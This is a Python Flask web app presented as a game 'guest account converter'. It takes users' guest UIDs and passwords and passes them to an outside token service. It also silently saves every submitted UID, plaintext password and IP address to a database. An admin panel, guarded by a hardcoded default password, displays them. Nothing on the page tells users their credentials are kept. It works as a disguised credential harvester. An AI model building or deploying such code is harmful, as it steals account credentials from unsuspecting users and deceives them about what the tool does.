import os
import sqlite3
import datetime
import requests
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "pg_gamer_secret_key_admin_panel")

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "PG_GAMER")

# Vercel Serverless DB Path
DB_PATH = '/tmp/tokens.db' if os.environ.get('VERCEL') else 'tokens.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS token_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_ip TEXT,
            uid TEXT,
            password TEXT,
            response_data TEXT,
            timestamp TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_setting(key):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT value FROM settings WHERE key = ?', (key,))
        row = cursor.fetchone()
        conn.close()
        return row[0] if row else ""
    except Exception:
        return ""

# Front-End HTML Template
HTML_MAIN = """
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GUEST ACCOUNT CONVERTER</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #06020c;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
        }
        .container {
            background: linear-gradient(145deg, #110522, #1b0a33);
            border: 1px solid #9d00ff;
            border-radius: 16px;
            padding: 25px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 0 25px rgba(157, 0, 255, 0.35);
        }
        h2 { text-align: center; color: #d666ff; margin-bottom: 20px; font-size: 22px; letter-spacing: 1px; }
        .form-group { margin-bottom: 16px; }
        label { display: block; font-size: 12px; color: #bb77ff; margin-bottom: 6px; text-transform: uppercase; font-weight: bold; }
        input {
            width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #6b00b3;
            background-color: #080210; color: #fff; font-size: 14px; outline: none; transition: 0.3s;
        }
        input:focus { border-color: #d666ff; box-shadow: 0 0 8px rgba(214, 102, 255, 0.5); }
        button.action-btn {
            width: 100%; padding: 14px; background: linear-gradient(90deg, #7b00ff, #e000ff);
            border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer;
            font-size: 16px; margin-top: 10px; transition: 0.2s;
        }
        button.action-btn:hover { opacity: 0.9; transform: translateY(-1px); }
        
        .result-container {
            margin-top: 20px; background: #080210; padding: 15px; border-radius: 8px;
            border: 1px solid #7b00ff; display: none;
        }
        .field-box { margin-bottom: 12px; }
        .field-label { font-size: 11px; color: #d666ff; font-weight: bold; margin-bottom: 4px; }
        .field-value {
            word-break: break-all; font-size: 13px; color: #00ffcc; background: #110522;
            padding: 10px; border-radius: 6px; border: 1px solid #3d176e; max-height: 100px; overflow-y: auto;
        }
        .copy-btn {
            margin-top: 6px; padding: 6px 12px; background: #00b386; color: white;
            border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 12px; width: 100%;
        }
        .copy-btn:hover { background: #00e6a8; }
        
        .social-links { margin-top: 25px; display: flex; gap: 10px; }
        .social-btn {
            flex: 1; text-align: center; padding: 10px; border-radius: 8px; text-decoration: none;
            color: white; font-weight: bold; font-size: 13px; transition: 0.3s;
        }
        .telegram-btn { background: #0088cc; }
        .telegram-btn:hover { background: #00aaff; }
        .youtube-btn { background: #ff0000; }
        .youtube-btn:hover { background: #ff3333; }
        
        .video-box { margin-top: 20px; text-align: center; border-top: 1px solid #3d176e; padding-top: 15px; }
        .video-box iframe { width: 100%; height: 210px; border-radius: 8px; border: 1px solid #7b00ff; }
    </style>
</head>
<body>

<div class="container">
    <h2>GUEST ACCOUNT SYSTEM</h2>

    <div class="form-group">
        <label>Guest UID</label>
        <input type="text" id="uid" placeholder="Enter Guest UID">
    </div>
    
    <div class="form-group">
        <label>Guest Password</label>
        <input type="text" id="password" placeholder="Enter Guest Password">
    </div>

    <button class="action-btn" onclick="processGuest()">SUBMIT / CONVERT →</button>

    <div class="result-container" id="result-box">
        <div class="field-box" id="info-box">
            <div class="field-label" id="res-label">RESPONSE DATA:</div>
            <div class="field-value" id="res-value"></div>
            <button class="copy-btn" id="copy-btn" onclick="copyResult()">📋 COPY DATA</button>
        </div>
    </div>

    {% if telegram_url or youtube_url %}
    <div class="social-links">
        {% if telegram_url %}
        <a href="{{ telegram_url }}" target="_blank" class="social-btn telegram-btn">✈ Telegram</a>
        {% endif %}
        {% if youtube_url %}
        <a href="{{ youtube_url }}" target="_blank" class="social-btn youtube-btn">▶ YouTube</a>
        {% endif %}
    </div>
    {% endif %}

    {% if video_embed_url %}
    <div class="video-box">
        <label>WATCH TUTORIAL</label>
        <iframe src="{{ video_embed_url }}" frameborder="0" allowfullscreen></iframe>
    </div>
    {% endif %}
</div>

<script>
    async function processGuest() {
        const uid = document.getElementById('uid').value.trim();
        const password = document.getElementById('password').value.trim();
        const resultBox = document.getElementById('result-box');
        const resVal = document.getElementById('res-value');

        if(!uid || !password) {
            alert("Please enter both UID and Password!");
            return;
        }

        resultBox.style.display = "block";
        resVal.innerText = "Processing request...";

        try {
            const res = await fetch('/api/process', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uid: uid, password: password })
            });
            const data = await res.json();
            
            if(data.success) {
                resVal.innerText = typeof data.data === 'object' ? JSON.stringify(data.data, null, 2) : data.data;
            } else {
                resVal.innerText = "Error: " + (data.message || "Failed to process");
            }
        } catch(err) {
            resVal.innerText = "Error: " + err.message;
        }
    }

    function copyResult() {
        const text = document.getElementById('res-value').innerText;
        if(text) {
            navigator.clipboard.writeText(text);
            alert("Copied!");
        }
    }
</script>

</body>
</html>
"""

# Admin Dashboard HTML
HTML_ADMIN = """
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
    <style>
        body { background-color: #07020d; color: #fff; font-family: Arial, sans-serif; padding: 20px; }
        h1, h2 { color: #d666ff; margin-bottom: 10px; }
        .card { background: #120624; padding: 20px; border-radius: 10px; border: 1px solid #6b00b3; margin-bottom: 20px; }
        input[type="text"] { width: 100%; padding: 10px; margin: 8px 0 15px 0; border-radius: 6px; border: 1px solid #7b00ff; background: #000; color: #fff; box-sizing: border-box; }
        button { padding: 10px 20px; background: #7b00ff; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
        button:hover { background: #9d00ff; }
        .logout { float: right; background: #ff0055; text-decoration: none; color: white; padding: 8px 15px; border-radius: 6px; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #120624; }
        th, td { border: 1px solid #3d176e; padding: 10px; text-align: left; font-size: 13px; word-break: break-all; }
        th { background-color: #7b00ff; color: #fff; }
    </style>
</head>
<body>

    <a href="/admin/logout" class="logout">Logout</a>
    <h1>Admin Panel</h1>

    <!-- Links Management Section -->
    <div class="card">
        <h2>Site Settings & Social Links</h2>
        <form action="/admin/save_settings" method="POST">
            <label>Telegram Group/Channel Link:</label>
            <input type="text" name="telegram_url" value="{{ telegram_url }}" placeholder="https://t.me/yourchannel">

            <label>YouTube Channel Link:</label>
            <input type="text" name="youtube_url" value="{{ youtube_url }}" placeholder="https://youtube.com/@yourchannel">

            <label>YouTube Embedded Video URL (For Tutorial):</label>
            <input type="text" name="video_embed_url" value="{{ video_embed_url }}" placeholder="https://www.youtube.com/embed/VIDEO_ID">

            <button type="submit">Save Settings</button>
        </form>
    </div>

    <!-- Logs Table -->
    <h2>Saved Guest Accounts Logs</h2>

    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>Timestamp</th>
                <th>IP Address</th>
                <th>Guest UID</th>
                <th>Guest Password</th>
                <th>API Response</th>
            </tr>
        </thead>
        <tbody>
            {% for log in logs %}
            <tr>
                <td>{{ log[0] }}</td>
                <td>{{ log[5] }}</td>
                <td>{{ log[1] }}</td>
                <td style="color:#00ffcc; font-weight:bold;">{{ log[2] }}</td>
                <td>{{ log[3] }}</td>
                <td style="color:#e066ff;">{{ log[4] }}</td>
            </tr>
            {% endfor %}
        </tbody>
    </table>

</body>
</html>
"""

# Admin Login HTML
HTML_LOGIN = """
<!DOCTYPE html>
<html>
<head>
    <title>Admin Login</title>
    <style>
        body { background: #07020d; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #120624; padding: 30px; border-radius: 10px; border: 1px solid #7b00ff; text-align: center; width: 300px; }
        input { padding: 10px; margin: 15px 0; width: 100%; border-radius: 6px; border: 1px solid #7b00ff; background: #000; color: #fff; box-sizing: border-box; }
        button { padding: 10px 20px; background: #7b00ff; color: white; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Admin Login</h2>
        <form method="POST">
            <input type="password" name="password" placeholder="Enter Admin Password">
            <button type="submit">Login</button>
        </form>
        {% if error %}<p style="color:#ff0055; margin-top: 10px;">{{ error }}</p>{% endif %}
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    telegram_url = get_setting('telegram_url')
    youtube_url = get_setting('youtube_url')
    video_embed_url = get_setting('video_embed_url')
    
    return render_template_string(
        HTML_MAIN,
        telegram_url=telegram_url,
        youtube_url=youtube_url,
        video_embed_url=video_embed_url
    )

@app.route('/api/process', methods=['POST'])
def process():
    data = request.get_json() or {}
    uid = data.get('uid', '').strip()
    password = data.get('password', '').strip()
    user_ip = request.remote_addr
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if not uid or not password:
        return jsonify({"success": False, "message": "UID and Password are required"})

    api_url = f"https://jwt-token-vert.vercel.app/token?uid={uid}&password={password}"
    
    try:
        res = requests.get(api_url, timeout=10)
        try:
            res_data = res.json()
        except Exception:
            res_data = res.text
    except Exception as e:
        res_data = f"API Request Failed: {str(e)}"

    # Save to SQLite Database
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO token_logs (user_ip, uid, password, response_data, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_ip, uid, password, str(res_data), timestamp))
        conn.commit()
        conn.close()
    except Exception:
        pass

    return jsonify({"success": True, "data": res_data})

# Admin Routes
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        pwd = request.form.get('password')
        if pwd == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect(url_for('admin'))
        else:
            return render_template_string(HTML_LOGIN, error="Incorrect Password!")

    if not session.get('admin_logged_in'):
        return render_template_string(HTML_LOGIN)

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM token_logs ORDER BY id DESC')
    logs = cursor.fetchall()
    conn.close()

    return render_template_string(
        HTML_ADMIN,
        logs=logs,
        telegram_url=get_setting('telegram_url'),
        youtube_url=get_setting('youtube_url'),
        video_embed_url=get_setting('video_embed_url')
    )

@app.route('/admin/save_settings', methods=['POST'])
def save_settings():
    if session.get('admin_logged_in'):
        telegram_url = request.form.get('telegram_url', '').strip()
        youtube_url = request.form.get('youtube_url', '').strip()
        video_embed_url = request.form.get('video_embed_url', '').strip()

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES ("telegram_url", ?)', (telegram_url,))
        cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES ("youtube_url", ?)', (youtube_url,))
        cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES ("video_embed_url", ?)', (video_embed_url,))
        conn.commit()
        conn.close()

    return redirect(url_for('admin'))

@app.route('/admin/logout')
def logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin'))

if __name__ == '__main__':
    app.run(debug=True, port=5000)
